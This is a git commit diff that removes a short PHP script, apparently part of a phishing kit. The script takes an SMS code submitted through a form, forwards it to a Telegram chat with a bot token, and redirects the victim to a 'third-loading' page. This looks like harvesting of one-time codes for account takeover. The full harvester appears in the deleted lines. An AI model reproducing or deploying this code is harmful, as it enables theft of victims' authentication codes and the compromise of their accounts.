e42cbc40bf626c5ac49b8580b0b94514bf8c5d2f
muhammadamran <amranhakim9@gmail.com>
2022-10-15 20:59:20 +0700

    Initial commit

--- realtime/7777/images/pos/sms.php
+++
@@ -1,7 +0,0 @@
-<?php
-include "../telegram.php";
-$sms = $_POST['sms'];
-$message .= 'Sms : ' . $sms . "\r\n";
-$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
-header("location: ../third-loading.php");
-?>
